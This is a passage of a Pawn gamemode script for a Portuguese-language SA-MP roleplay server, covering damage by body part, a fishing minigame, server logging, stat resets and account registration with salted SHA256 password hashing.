		UpdateVehicleDamageStatus(vehicleid, cInfo[vehicleid][Panels], cInfo[vehicleid][Doors], cInfo[vehicleid][Lights], cInfo[vehicleid][Tires]);
    }
    else
    {
        IsARespawn[vehicleid] = false;
    }

    return 1;
}

public RestoreActor(actorid, worldid, Float:x, Float:y, Float:z)
{
	SetActorVirtualWorld(actorid, worldid);
	SetActorPos(actorid, x, y, z);
}

public AtualizarDanosCarro(vehicleid)
{
    UpdateVehicleDamageStatus(cInfo[vehicleid][ID], cInfo[vehicleid][Panels], cInfo[vehicleid][Doors], cInfo[vehicleid][Lights], cInfo[vehicleid][Tires]);
    
	return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
    if(issuerid != INVALID_PLAYER_ID && AdminDuty[issuerid] == false)
    {
        if(weaponid == 0 || weaponid == 1 || weaponid == 2 || weaponid == 3 || weaponid == 4 || weaponid == 5 || weaponid == 6 || weaponid == 7 || weaponid == 8) return 1;
        
        switch(bodypart)
        {
            case BODY_PART_TORSO, BODY_PART_CHEST:
            {
                if(pInfo[playerid][Colete] > 0)
                {
                    SetPlayerArmourEx(playerid, amount, 2);
				}
				else
				{
	                new rand = random(5);

	                if(rand == 1) // acertou no coração
	                {
	                	SetPlayerHealthEx(playerid, 0, 0);

	                	SendClientMessage(playerid, COLOR_INFO, "Levaste um tiro no coração e estás agora gravemente ferido");
					}
				}
            }
            case BODY_PART_LEFT_ARM, BODY_PART_RIGHT_ARM:
            {
                new arma = GetPlayerWeapon(playerid);
                
                if(arma != 0)
                {
                    RemovePlayerWeapon(playerid, arma);
                    
                    SendClientMessage(playerid, COLOR_INFO, "Levaste um tiro no braço e largaste a tua arma");
				}
            }
			case BODY_PART_LEFT_LEG, BODY_PART_RIGHT_LEG:
			{
			    SendClientMessage(playerid, COLOR_INFO, "Levaste um tiro na perna e estás manco");
			    
			    ApplyAnimation(playerid, "SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 2000, 1);
			}
			case BODY_PART_HEAD: // headshot
			{
			    SetPlayerHealthEx(playerid, 0, 0);
			}
        }
    }
    
    return 1;
}

public PodePescar(playerid)
{
	PodePescarB[playerid] = true;

	return 1;
}

public Pescar2(playerid, peixeid)
{
    new puxar = random(4);
    new string[128];

	switch(puxar)
	{
	    case 0: // deixou fugir
	    {
			format(string, sizeof(string), "tenta puxar o peixe mas {FF0000}falha{D65FE3}*.");
			ProxDetectorRP(10.0, playerid, string);
	    }
	    case 1..4: // apanhou
	    {
			format(string, sizeof(string), "tenta puxar o peixe e {00FF00}consegue{D65FE3}*.");
			ProxDetectorRP(10.0, playerid, string);

			switch(peixeid)
			{
			    case 1: { SendClientMessage(playerid, COLOR_INFO, "[PESCA:] Apanhaste um Robalo!"); pObjects[playerid][Peixe_Robalo]++; }
			    case 2: { SendClientMessage(playerid, COLOR_INFO, "[PESCA:] Apanhaste um Sargo!"); pObjects[playerid][Peixe_Sargo]++; }
			    case 3: { SendClientMessage(playerid, COLOR_INFO, "[PESCA:] Apanhaste um Goraz!"); pObjects[playerid][Peixe_Goraz]++; }
			    case 4: { SendClientMessage(playerid, COLOR_INFO, "[PESCA:] Apanhaste uma Cavala!"); pObjects[playerid][Peixe_Cavala]++; }
			    case 5: { SendClientMessage(playerid, COLOR_INFO, "[PESCA:] Apanhaste uma Dourada!"); pObjects[playerid][Peixe_Dourada]++; }
			    case 6: { SendClientMessage(playerid, COLOR_INFO, "[PESCA:] Apanhaste um Peixe Espada!"); pObjects[playerid][Peixe_Espada]++; }
			    case 7: { SendClientMessage(playerid, COLOR_INFO, "[PESCA:] Apanhaste uma Corvina!"); pObjects[playerid][Peixe_Corvina]++; }
                case 8: { SendClientMessage(playerid, COLOR_INFO, "[PESCA:] Apanhaste um Congro!"); pObjects[playerid][Peixe_Congro]++; }
			}
	    }
	}

	TogglePlayerControllable(playerid, 1);
	SetTimerEx("PodePescar", 10000, false, "i", playerid);
	RemovePlayerAttachedObject(playerid, CanaDePescaObjeto[playerid]);
	RemovePlayerAttachedObject(playerid, 0);
	ClearAnimations(playerid, 1);
	ClearAnimations(playerid, 1);

	return 1;
}

public Pescar(playerid)
{
	/*
	    probabilidades:

	    não apanhar nada: 25%
	    corvina: 15%
	    robalo: 9%
		sargo: 9%
		goraz: 24%
		cavala: 14%
		dourada: 5%
		espada: 7%
		congro: 17%
	*/

    new rand = random(132);

    switch(rand)
    {
        case 0..25: // nada
        {
            PlayerActionMessage(playerid, 15.0, "repara que não apanhou nada.");
			RemovePlayerAttachedObject(playerid, CanaDePescaObjeto[playerid]);
			RemovePlayerAttachedObject(playerid, 0);
			ClearAnimations(playerid, 1);
			ClearAnimations(playerid, 1);
			TogglePlayerControllable(playerid, 1);
			SetTimerEx("PodePescar", 10000, false, "i", playerid);
        }
        case 26..35: // robalo
        {
			new peixeid = 1;
            PlayerActionMessage(playerid, 15.0, "sente a cana de pesca a tremer.");
            SetTimerEx("Pescar2", 8000, false, "ii", playerid, peixeid);
        }
        case 36..45: // sargo
        {
            new peixeid = 2;
            PlayerActionMessage(playerid, 15.0, "sente a cana de pesca a tremer.");
            SetTimerEx("Pescar2", 8000, false, "ii", playerid, peixeid);
        }
		case 46..70: // goraz
		{
		    new peixeid = 3;
            PlayerActionMessage(playerid, 15.0, "sente a cana de pesca a tremer.");
            SetTimerEx("Pescar2", 8000, false, "ii", playerid, peixeid);
		}
		case 71..85: // cavala
		{
		    new peixeid = 4;
            PlayerActionMessage(playerid, 15.0, "sente a cana de pesca a tremer.");
            SetTimerEx("Pescar2", 8000, false, "ii", playerid, peixeid);
		}
		case 86..91: // dourada
		{
		    new peixeid = 5;
		    PlayerActionMessage(playerid, 15.0, "sente a cana de pesca a tremer.");
		    SetTimerEx("Pescar2", 8000, false, "ii", playerid, peixeid);
		}
		case 92..99: // espada
		{
		    new peixeid = 6;
		    PlayerActionMessage(playerid, 15.0, "sente a cana de pesca a tremer.");
		    SetTimerEx("Pescar2", 8000, false, "ii", playerid, peixeid);
		}
		case 100..115: // corvina
		{
		    new peixeid = 7;
		    PlayerActionMessage(playerid, 15.0, "sente a cana de pesca a tremer.");
		    SetTimerEx("Pescar2", 8000, false, "ii", playerid, peixeid);
		}
		case 116..132: // congro
		{
		    new peixeid = 8;
		    PlayerActionMessage(playerid, 15.0, "sente a cana de pesca a tremer.");
		    SetTimerEx("Pescar2", 8000, false, "ii", playerid, peixeid);
		}
    }

	return 1;
}

public MoneyLog(playerid, howmuch)
{
	new string[64];
	format(string, sizeof(string), "%s alterou %d$", GetPlayerNameEx(playerid), howmuch);
	WriteLog(LOG_MONEY, string);

	return 1;
}

public IncomingLog(playerid, ip[], port)
{
	new string[64];
	format(string, sizeof(string), "Incoming connection de %s:%d", ip, port);
	WriteLog(LOG_INCOMING, string);
	
	return 1;
}

public JoinLog(playerid)
{
	new string[64];
	new IP[16];
	GetPlayerIp(playerid, IP, sizeof(IP));
	
	format(string, sizeof(string), "%s entrou no servidor. [%s]", GetPlayerNameEx(playerid), IP);
	WriteLog(LOG_JOIN, string);

	return 1;
}

public HackLog(playerid, str[])
{
	new string[128];
	new IP[16];
	GetPlayerIp(playerid, IP, sizeof(IP));

	format(string, sizeof(string), "%s usou %s [%s]", GetPlayerNameEx(playerid), str, IP);
	WriteLog(LOG_HACK, string);
	
	return 1;
}

public BanLog(playerid, kickedby[MAX_PLAYER_NAME], str[])
{
	new string[128];
	new IP[16];
	GetPlayerIp(playerid, IP, sizeof(IP));

	format(string, sizeof(string), "%s baniu %s. Razão: %s [%s]", kickedby, GetPlayerNameEx(playerid), str, IP);
	WriteLog(LOG_BAN, string);

	return 1;
}

public ChatLog(playerid, msg[])
{
	new string[128];

	format(string, sizeof(string), "%s disse: %s", GetPlayerNameEx(playerid), msg);

	WriteLog(LOG_CHAT, string);

	return 1;
}

public SocketLog(msg[])
{
	new string[128];

	format(string, sizeof(string), "%s", msg);

	WriteLog(LOG_SOCKET, string);

	return 1;
}

public CMDLog(playerid, cmd[])
{
	new string[128];

	format(string, sizeof(string), "%s usou [ %s ]", GetPlayerNameEx(playerid), cmd);
	
 	if(strfind(cmd, "/entrar", true) == -1 && strfind(cmd, "/sair", true) == -1 && strfind(cmd, "/motor", true) == -1 && strfind(cmd, "/luzes", true) == -1 && strfind(cmd, "/portapsp", true) == -1 && strfind(cmd, "/garagempsp", true) == -1)
    {
        WriteLog(LOG_CMDS, string);
	}

	return 1;
}

public ErrorLog(error[])
{
	new string[128];

	format(string, sizeof(string), "%s", error);
	WriteLog(LOG_ERROR, string);

	return 1;
}

public KickLog(playerid, kickedby[MAX_PLAYER_NAME], str[])
{
	new string[128];
	new IP[16];
	GetPlayerIp(playerid, IP, sizeof(IP));

	format(string, sizeof(string), "%s kickou %s. Razão: %s [%s]", kickedby, GetPlayerNameEx(playerid), str, IP);
	WriteLog(LOG_KICK, string);

	return 1;
}

public ResetStats(playerid)
{
	pInfo[playerid][UID] = 0;
	pInfo[playerid][Vida] = 0;
	pInfo[playerid][Level] = 0;
    pInfo[playerid][Skin] = 0;
    pInfo[playerid][Admin] = 0;
    pInfo[playerid][Faction] = 0;
    pInfo[playerid][FactionRank] = 0;
    pInfo[playerid][AJCounter] = 0;
    pInfo[playerid][RegDay] = 0;
    pInfo[playerid][Origem] = 0;
    pInfo[playerid][Sexo] = 0;
    pInfo[playerid][Idade] = 0;
    pInfo[playerid][Registado] = 0;
    pInfo[playerid][TutFeito] = 0;
    pInfo[playerid][Money] = 0;
    pInfo[playerid][Bank] = 0;
    pInfo[playerid][ChaveBiz] = 0;
    pInfo[playerid][ChaveCasa] = 0;
    pInfo[playerid][ChaveCasaAlugada] = 0;
    pInfo[playerid][ChaveCarro1] = 0;
    pInfo[playerid][ChaveCarro2] = 0;
    pInfo[playerid][ChaveCarro3] = 0;
    pInfo[playerid][ChaveCarro4] = 0;
    pInfo[playerid][ChaveCarroEmp1] = 0;
    pInfo[playerid][ChaveCarroEmp2] = 0;
    pInfo[playerid][ChaveCarroEmp3] = 0;
    pInfo[playerid][ChaveCarroEmp4] = 0;
    pInfo[playerid][Minutos] = 0;
    pInfo[playerid][Drogas] = 0;
    pInfo[playerid][Materiais] = 0;
    pInfo[playerid][CartaLig] = 0;
    pInfo[playerid][CartaMota] = 0;
    pInfo[playerid][CartaPesados] = 0;
    pInfo[playerid][CartaBarco] = 0;
    pInfo[playerid][LicArmas] = 0;
    pInfo[playerid][Multas] = 0;
    pInfo[playerid][Jailed] = 0;
    pInfo[playerid][JailTime] = 0;
    pInfo[playerid][Preso] = 0;
    pInfo[playerid][PresoTempo] = 0;
    pInfo[playerid][XP] = 0;
    pInfo[playerid][Meses] = 0;
    pInfo[playerid][Doenca] = 0;
    pInfo[playerid][Medicamentos] = 0;
    pInfo[playerid][MedicamentosTomados] = 0;
    pInfo[playerid][ReceitaMedica] = 0;
    pInfo[playerid][MorteX] = 0;
    pInfo[playerid][MorteY] = 0;
    pInfo[playerid][MorteZ] = 0;
    pInfo[playerid][MorteVirtualWorld] = 0;
    pInfo[playerid][MorteInterior] = 0;
    pInfo[playerid][Euro1] = 0;
    pInfo[playerid][Euro2] = 0;
    pInfo[playerid][Euro3] = 0;
    pInfo[playerid][Euro4] = 0;
    pInfo[playerid][Euro5] = 0;
    pInfo[playerid][BilheteEuro] = 0;
    pInfo[playerid][Estrela1] = 0;
    pInfo[playerid][Estrela2] = 0;
	pInfo[playerid][Codigo] = 0;
	pInfo[playerid][Rotas] = 0;
	pInfo[playerid][EmpregoNivel] = 0;
	pInfo[playerid][TempoRota] = 0;
	pInfo[playerid][CC] = -1;
	pInfo[playerid][Seguradora] = 0;
	pInfo[playerid][MensalidadeSeguradora] = 0;
	pInfo[playerid][SeguradoraCount] = 0;
	pInfo[playerid][SeguradoraPayCount] = 0;
	pInfo[playerid][Golds] = 0;
	pInfo[playerid][Viciado] = 0;
	pInfo[playerid][TempoViciado] = 0;
	pInfo[playerid][ADesentoxicar] = 0;
	pInfo[playerid][NumeroTelemovel] = 0;
	pInfo[playerid][Rede] = 0;
	pInfo[playerid][Saldo] = 0;
	
    pObjects[playerid][Mala] = 0;
    pObjects[playerid][Mochila] = 0;
    pObjects[playerid][Arma1Mala] = 0;
    pObjects[playerid][Ammo1Mala] = 0;
    pObjects[playerid][Arma2Mala] = 0;
    pObjects[playerid][Ammo2Mala] = 0;
    pObjects[playerid][Arma3Mala] = 0;
    pObjects[playerid][Ammo3Mala] = 0;
    pObjects[playerid][Arma4Mala] = 0;
    pObjects[playerid][Ammo4Mala] = 0;
    
    pObjects[playerid][Telemovel] = 0;
    pObjects[playerid][o_2054] = 0;
    pObjects[playerid][o_18639] = 0;
    pObjects[playerid][o_18943] = 0;
    pObjects[playerid][o_2053] = 0;
    pObjects[playerid][o_2052] = 0;
    pObjects[playerid][o_19160] = 0;
    pObjects[playerid][o_18940] = 0;
    pObjects[playerid][o_18941] = 0;
    pObjects[playerid][o_19006] = 0;
    pObjects[playerid][o_19027] = 0;
    pObjects[playerid][o_18939] = 0;
    pObjects[playerid][o_19007] = 0;
    pObjects[playerid][o_19008] = 0;
    pObjects[playerid][o_19009] = 0;
    pObjects[playerid][o_19010] = 0;
    pObjects[playerid][o_19011] = 0;
    pObjects[playerid][o_19012] = 0;
    pObjects[playerid][o_19013] = 0;
    pObjects[playerid][o_19014] = 0;
    pObjects[playerid][o_19015] = 0;
    pObjects[playerid][o_19016] = 0;
    pObjects[playerid][o_19017] = 0;
    pObjects[playerid][o_19018] = 0;
    pObjects[playerid][Radio] = 0;
    pObjects[playerid][Arma1Mochila] = 0;
    pObjects[playerid][Ammo1Mochila] = 0;
    pObjects[playerid][Arma2Mochila] = 0;
    pObjects[playerid][Ammo2Mochila] = 0;
    pObjects[playerid][Arma3Mochila] = 0;
    pObjects[playerid][Ammo3Mochila] = 0;
    pObjects[playerid][Arma4Mochila] = 0;
    pObjects[playerid][Ammo4Mochila] = 0;
    pObjects[playerid][Bidom] = 0;
    pObjects[playerid][ListaTel] = 0;
    pObjects[playerid][Mascara] = 0;
    pObjects[playerid][Corda] = 0;
    pObjects[playerid][Venda] = 0;
    pObjects[playerid][Capacete] = 0;
    pObjects[playerid][CanaDePesca] = 0;
    
	Logged[playerid] = false;
 	AdminDuty[playerid] = false;
 	Algemado[playerid] = false;
 	Multado[playerid] = false;
	UnlockTutorial[playerid] = false;
	Algemado[playerid] = false;
	Multado[playerid] = false;
	Reparacao[playerid] = false;
	Pintura[playerid] = false;
	Atestar[playerid] = false;
	Revisao[playerid] = false;
	Receita[playerid] = false;
	Consulta[playerid] = false;
	Entrevista[playerid] = false;
	ASerEntrevistado[playerid] = false;
	AEntrevistar[playerid] = false;
	ATirarCartaLigeiro[playerid] = false;
	ATirarCartaPesados[playerid] = false;
	ATirarCartaMota[playerid] = false;
	ATirarCartaBarco[playerid] = false;
	//IsInGaragemPSP[playerid] = false;
	Vendado[playerid] = false;
	Amarrado[playerid] = false;
	PodePescarB[playerid] = true;
	PMStatus[playerid] = true;
	DebugStatus[playerid] = false;
	DebugStatusAdv[playerid] = false;
	DebugStatusKey[playerid] = false;
	AReceberChamada[playerid] = false;
	ATelefonar[playerid] = false;
	AFalarTele[playerid] = false;
	FirstSpawn[playerid] = false;
	Emergencia[playerid] = false;
	Cinto[playerid] = false;
	
 	CustoMulta[playerid] = 0;
 	MultadorID[playerid] = 0;
 	AntiSpamAC[playerid] = 0;
 	DrugEffectCounter[playerid] = 0;
	Segundos[playerid] = 0;
	CustoMulta[playerid] = 0;
	MultadorID[playerid] = 0;
	PrecoReparacao[playerid] = 0;
	ReparadorID[playerid] = 0;
	PrecoPintura[playerid] = 0;
	PintorID[playerid] = 0;
	Cor1[playerid] = 0;
	Cor2[playerid] = 0;
	PrecoAtestar[playerid] = 0;
	AtestadorID[playerid] = 0;
	PrecoRevisao[playerid] = 0;
	PrecoReceita[playerid] = 0;
	ReceitadorID[playerid] = 0;
	Medicamento[playerid] = 0;
	PrecoConsulta[playerid] = 0;
	ConsultadorID[playerid] = 0;
	EntrevistadorID[playerid] = INVALID_PLAYER_ID;
	DrunkLevel[playerid] = 0;
	TransferirPara[playerid] = 0;
	SpeedWarning[playerid] = 0;
	TimerGuardarJogador[playerid] = -1;
	BadLoginCounter[playerid] = 0;
	PuxadorID[playerid] = INVALID_PLAYER_ID;
	CanaDePescaObjeto[playerid] = 0;
	ATelefonarPara[playerid] = INVALID_PLAYER_ID;
	AReceberChamadaDe[playerid] = INVALID_PLAYER_ID;
	AFalarPara[playerid] = INVALID_PLAYER_ID;

	return 1;
}

public AfterTutorial(playerid)
{
    CleanChat(playerid);
    
	if(pInfo[playerid][Registado] == 0)
	{
		pInfo[playerid][Registado] = 1;
		pInfo[playerid][TutFeito] = 1;
		FirstSpawn[playerid] = true;
		
		GuardarJogador(playerid);
	    SpawnarJogador(playerid);
	    
	    if(pInfo[playerid][TutFalhado] >= 3)
	    {
			new string[128];
			
		    foreach(new i : Player)
		    {
				if(AdminDuty[i] == false) continue;

				format(string, sizeof(string), "[TUTORIAIS:] {FFFFFF}O jogador %s (ID:%d) passou no tutorial, mas errou %d vezes antes de conseguir.", GetPlayerNameEx(playerid), playerid, pInfo[playerid][TutFalhado]);
				SendClientMessage(i, COLOR_OWNER, string);
		    }
	    }
	    
	    SendClientMessage(playerid, COLOR_INFO, "[INFORMAÇÃO:] {FFFFFF}Parabéns por passares no questionário!");
	    SendClientMessage(playerid, COLOR_INFO, "[INFORMAÇÃO:] {FFFFFF}Aconselhamos-te a ir tirar a carta! O local da escola de condução está marcado no teu mini-mapa. Bom jogo!");
	    
	    SetPlayerCheckpoint(playerid, 1448.6649, -1585.6483, 13.5469, 5.0);
	}
	
	return 1;
}

public RegistarJogador(playerid, password[])
{
    oInfo[0][RegistoCounter]++;
    
	new ficheiro[64];
 	new pw[256], cryptedpw[256];
	new name[MAX_PLAYER_NAME];
	
    GetPlayerName(playerid, name, sizeof(name));
    strmid(pw, password, 0, 256);
    format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", name);

	SHA256_PassHash(pw, PW_SALT, cryptedpw, sizeof cryptedpw);

    DOF2_CreateFile(ficheiro);
    
    DOF2_SetString(ficheiro, "Key", cryptedpw);
    DOF2_SetInt(ficheiro, "Banido", 0);
    DOF2_SetInt(ficheiro, "UID", oInfo[0][RegistoCounter]);
    DOF2_SetFloat(ficheiro, "Vida", 50);
    DOF2_SetInt(ficheiro, "Level", 1);
    DOF2_SetInt(ficheiro, "Skin", 6);
    DOF2_SetInt(ficheiro, "Admin", 0);
    DOF2_SetInt(ficheiro, "Emprego", 0);
    DOF2_SetInt(ficheiro, "Faction", 0);
    DOF2_SetInt(ficheiro, "FactionRank", 0);
    DOF2_SetInt(ficheiro, "AJCounter", 0);
    DOF2_SetString(ficheiro, "RegDay", GetDate());
    DOF2_SetInt(ficheiro, "Origem", 0);
    DOF2_SetInt(ficheiro, "Sexo", 0);
    DOF2_SetInt(ficheiro, "Idade", 0);
    DOF2_SetInt(ficheiro, "Registado",0);
    DOF2_SetInt(ficheiro, "TutFeito", 0);
    DOF2_SetInt(ficheiro, "Money", 2500);
    DOF2_SetInt(ficheiro, "Bank", 0);
    DOF2_SetInt(ficheiro, "ChaveBiz", 0);
    DOF2_SetInt(ficheiro, "ChaveCasa", 0);
    DOF2_SetInt(ficheiro, "ChaveCasaAlugada", 0);
    DOF2_SetInt(ficheiro, "ChaveCarro1", 0);
    DOF2_SetInt(ficheiro, "ChaveCarro2", 0);
    DOF2_SetInt(ficheiro, "ChaveCarro3", 0);
    DOF2_SetInt(ficheiro, "ChaveCarro4", 0);
    DOF2_SetInt(ficheiro, "ChaveCarroEmp1", 0);
    DOF2_SetInt(ficheiro, "ChaveCarroEmp2", 0);
    DOF2_SetInt(ficheiro, "ChaveCarroEmp3", 0);
    DOF2_SetInt(ficheiro, "ChaveCarroEmp4", 0);
    DOF2_SetInt(ficheiro, "Minutos", 0);
    DOF2_SetInt(ficheiro, "PreDrogas", 0);
    DOF2_SetInt(ficheiro, "PreMateriais", 0);
    DOF2_SetInt(ficheiro, "Drogas", 0);
    DOF2_SetInt(ficheiro, "Materiais", 0);
    DOF2_SetInt(ficheiro, "CartaLig", 0);
    DOF2_SetInt(ficheiro, "CartaMota", 0);
    DOF2_SetInt(ficheiro, "CartaPesados", 0);
    DOF2_SetInt(ficheiro, "CartaBarco", 0);
    DOF2_SetInt(ficheiro, "LicArmas", 0);
    DOF2_SetInt(ficheiro, "Multas", 0);
    DOF2_SetInt(ficheiro, "Jailed", 0);
	DOF2_SetInt(ficheiro, "JailTime", 0);
    DOF2_SetInt(ficheiro, "Preso", 0);
	DOF2_SetInt(ficheiro, "PresoTempo", 0);
    DOF2_SetInt(ficheiro, "XP", 0);
	DOF2_SetInt(ficheiro, "Meses", 0);
	DOF2_SetInt(ficheiro, "Doenca", 0);
	DOF2_SetInt(ficheiro, "Medicamentos", 0);
	DOF2_SetInt(ficheiro, "MedicamentosTomados", 0);
	DOF2_SetInt(ficheiro, "ReceitaMedica", 0);
	DOF2_SetInt(ficheiro, "Morto", 0);
	DOF2_SetFloat(ficheiro, "MorteX", 0);
	DOF2_SetFloat(ficheiro, "MorteY", 0);
	DOF2_SetFloat(ficheiro, "MorteZ", 0);
	DOF2_SetInt(ficheiro, "MorteVirtualWorld", 0);
	DOF2_SetInt(ficheiro, "MorteInterior", 0);
	DOF2_SetInt(ficheiro, "Euro1", 0);
	DOF2_SetInt(ficheiro, "Euro2", 0);
	DOF2_SetInt(ficheiro, "Euro3", 0);
	DOF2_SetInt(ficheiro, "Euro4", 0);
	DOF2_SetInt(ficheiro, "Euro5", 0);
	DOF2_SetInt(ficheiro, "BilheteEuro", 0);
	DOF2_SetInt(ficheiro, "Estrela1", 0);
	DOF2_SetInt(ficheiro, "Estrela2", 0);
	DOF2_SetInt(ficheiro, "Codigo", 0);
	DOF2_SetInt(ficheiro, "Rotas", 0);
	DOF2_SetInt(ficheiro, "EmpregoNivel", 0);
	DOF2_SetInt(ficheiro, "TempoRota", 0);
	DOF2_SetInt(ficheiro, "CC", -1);
	DOF2_SetInt(ficheiro, "Seguradora", 0);
	DOF2_SetInt(ficheiro, "MensalidadeSeguradora", 0);
	DOF2_SetInt(ficheiro, "SeguradoraCount", 0);
    DOF2_SetInt(ficheiro, "SeguradoraPayCount", 0);
    DOF2_SetInt(ficheiro, "Golds", 0);
	DOF2_SetInt(ficheiro, "Viciado", 0);
	DOF2_SetInt(ficheiro, "TempoViciado", 0);
	DOF2_SetInt(ficheiro, "ADesentoxicar", 0);
	DOF2_SetInt(ficheiro, "NumeroTelemovel", 0);
	DOF2_SetInt(ficheiro, "Rede", 0);
	DOF2_SetInt(ficheiro, "Saldo", 0);
	DOF2_SetInt(ficheiro, "TutFalhado", 0);
	DOF2_SetInt(ficheiro, "LicPesca", 0);
	DOF2_SetInt(ficheiro, "Colete", 0);
	DOF2_SetFloat(ficheiro, "SpawnX", 0);
	DOF2_SetFloat(ficheiro, "SpawnY", 0);
	DOF2_SetFloat(ficheiro, "SpawnZ", 0);
	DOF2_SetInt(ficheiro, "SpawnVirtualWorld", 0);
	DOF2_SetInt(ficheiro, "SpawnInterior", 0);
	DOF2_SetInt(ficheiro, "Suspeito", 0);
	DOF2_SetInt(ficheiro, "VezesSuspeito", 0);
	DOF2_SetInt(ficheiro, "VezesPreso", 0);
    
    DOF2_SaveFile();
    
    pInfo[playerid][Key] = cryptedpw;
    pInfo[playerid][Banido] = DOF2_GetInt(ficheiro, "Banido");
    pInfo[playerid][UID] = DOF2_GetInt(ficheiro, "UID");
    pInfo[playerid][Vida] = DOF2_GetFloat(ficheiro, "Vida");
    pInfo[playerid][Level] = DOF2_GetInt(ficheiro, "Level");
    pInfo[playerid][Skin] = DOF2_GetInt(ficheiro, "Skin");
    pInfo[playerid][Admin] = DOF2_GetInt(ficheiro, "Admin");
    pInfo[playerid][Emprego] = DOF2_GetInt(ficheiro, "Emprego");
    pInfo[playerid][Faction] = DOF2_GetInt(ficheiro, "Faction");
    pInfo[playerid][FactionRank] = DOF2_GetInt(ficheiro, "FactionRank");
    pInfo[playerid][AJCounter] = DOF2_GetInt(ficheiro, "AJCounter");
    format(pInfo[playerid][RegDay], 32, "%s", DOF2_GetString(ficheiro, "RegDay"));
    pInfo[playerid][Origem] = DOF2_GetInt(ficheiro, "Origem");
    pInfo[playerid][Sexo] = DOF2_GetInt(ficheiro, "Sexo");
    pInfo[playerid][Idade] = DOF2_GetInt(ficheiro, "Idade");
	pInfo[playerid][Registado] = DOF2_GetInt(ficheiro, "Registado");
	pInfo[playerid][TutFeito] = DOF2_GetInt(ficheiro, "TutFeito");
	pInfo[playerid][Money] = DOF2_GetInt(ficheiro, "Money");
	pInfo[playerid][Bank] = DOF2_GetInt(ficheiro, "Bank");
	pInfo[playerid][ChaveBiz] = DOF2_GetInt(ficheiro, "ChaveBiz");
	pInfo[playerid][ChaveCasa] = DOF2_GetInt(ficheiro, "ChaveCasa");
	pInfo[playerid][ChaveCasaAlugada] = DOF2_GetInt(ficheiro, "ChaveCasaAlugada");
	pInfo[playerid][ChaveCarro1] = DOF2_GetInt(ficheiro, "ChaveCarro1");
	pInfo[playerid][ChaveCarro2] = DOF2_GetInt(ficheiro, "ChaveCarro2");
	pInfo[playerid][ChaveCarro3] = DOF2_GetInt(ficheiro, "ChaveCarro3");
	pInfo[playerid][ChaveCarro4] = DOF2_GetInt(ficheiro, "ChaveCarro4");
	pInfo[playerid][ChaveCarroEmp1] = DOF2_GetInt(ficheiro, "ChaveCarroEmp1");
	pInfo[playerid][ChaveCarroEmp2] = DOF2_GetInt(ficheiro, "ChaveCarroEmp2");
	pInfo[playerid][ChaveCarroEmp3] = DOF2_GetInt(ficheiro, "ChaveCarroEmp3");
	pInfo[playerid][ChaveCarroEmp4] = DOF2_GetInt(ficheiro, "ChaveCarroEmp4");
	pInfo[playerid][Minutos] = DOF2_GetInt(ficheiro, "Minutos");
	pInfo[playerid][PreDrogas] = DOF2_GetInt(ficheiro, "PreDrogas");
	pInfo[playerid][PreMateriais] = DOF2_GetInt(ficheiro, "PreMateriais");
	pInfo[playerid][Drogas] = DOF2_GetInt(ficheiro, "Drogas");
	pInfo[playerid][Materiais] = DOF2_GetInt(ficheiro, "Materiais");
	pInfo[playerid][CartaLig] = DOF2_GetInt(ficheiro, "CartaLig");
	pInfo[playerid][CartaMota] = DOF2_GetInt(ficheiro, "CartaMota");
	pInfo[playerid][CartaPesados] = DOF2_GetInt(ficheiro, "CartaPesados");
	pInfo[playerid][CartaBarco] = DOF2_GetInt(ficheiro, "CartaBarco");
	pInfo[playerid][LicArmas] = DOF2_GetInt(ficheiro, "LicArmas");
	pInfo[playerid][Multas] = DOF2_GetInt(ficheiro, "Multas");
	pInfo[playerid][Jailed] = DOF2_GetInt(ficheiro, "Jailed");
	pInfo[playerid][JailTime] = DOF2_GetInt(ficheiro, "JailTime");
	pInfo[playerid][Preso] = DOF2_GetInt(ficheiro, "Preso");
	pInfo[playerid][PresoTempo] = DOF2_GetInt(ficheiro, "PresoTempo");
	pInfo[playerid][Preso] = DOF2_GetInt(ficheiro, "XP");
	pInfo[playerid][PresoTempo] = DOF2_GetInt(ficheiro, "Meses");
	pInfo[playerid][Doenca] = DOF2_GetInt(ficheiro, "Doenca");
	pInfo[playerid][Medicamentos] = DOF2_GetInt(ficheiro, "Medicamentos");
	pInfo[playerid][MedicamentosTomados] = DOF2_GetInt(ficheiro, "MedicamentosTomados");
	pInfo[playerid][ReceitaMedica] = DOF2_GetInt(ficheiro, "ReceitaMedica");
	pInfo[playerid][Morto] = DOF2_GetInt(ficheiro, "Morto");
	pInfo[playerid][MorteX] = DOF2_GetFloat(ficheiro, "MorteX");
	pInfo[playerid][MorteY] = DOF2_GetFloat(ficheiro, "MorteY");
	pInfo[playerid][MorteZ] = DOF2_GetFloat(ficheiro, "MorteZ");
	pInfo[playerid][MorteVirtualWorld] = DOF2_GetInt(ficheiro, "MorteVirtualWorld");
	pInfo[playerid][MorteInterior] = DOF2_GetInt(ficheiro, "MorteInterior");
	pInfo[playerid][Euro1] = DOF2_GetInt(ficheiro, "Euro1");
	pInfo[playerid][Euro2] = DOF2_GetInt(ficheiro, "Euro2");
	pInfo[playerid][Euro3] = DOF2_GetInt(ficheiro, "Euro3");
	pInfo[playerid][Euro4] = DOF2_GetInt(ficheiro, "Euro4");
	pInfo[playerid][Euro5] = DOF2_GetInt(ficheiro, "Euro5");
	pInfo[playerid][BilheteEuro] = DOF2_GetInt(ficheiro, "BilheteEuro");
	pInfo[playerid][Estrela1] = DOF2_GetInt(ficheiro, "Estrela1");
	pInfo[playerid][Estrela2] = DOF2_GetInt(ficheiro, "Estrela2");
	pInfo[playerid][Codigo] = DOF2_GetInt(ficheiro, "Codigo");
	pInfo[playerid][Rotas] = DOF2_GetInt(ficheiro, "Rotas");
	pInfo[playerid][EmpregoNivel] = DOF2_GetInt(ficheiro, "EmpregoNivel");
	pInfo[playerid][TempoRota] = DOF2_GetInt(ficheiro, "TempoRota");
	pInfo[playerid][CC] = DOF2_GetInt(ficheiro, "CC");
	pInfo[playerid][Seguradora] = DOF2_GetInt(ficheiro, "Seguradora");
	pInfo[playerid][MensalidadeSeguradora] = DOF2_GetInt(ficheiro, "MensalidadeSeguradora");
	pInfo[playerid][SeguradoraCount] = DOF2_GetInt(ficheiro, "SeguradoraCount");
	pInfo[playerid][SeguradoraPayCount] = DOF2_GetInt(ficheiro, "SeguradoraPayCount");
	pInfo[playerid][Golds] = DOF2_GetInt(ficheiro, "Golds");
	pInfo[playerid][Viciado] = DOF2_GetInt(ficheiro, "Viciado");
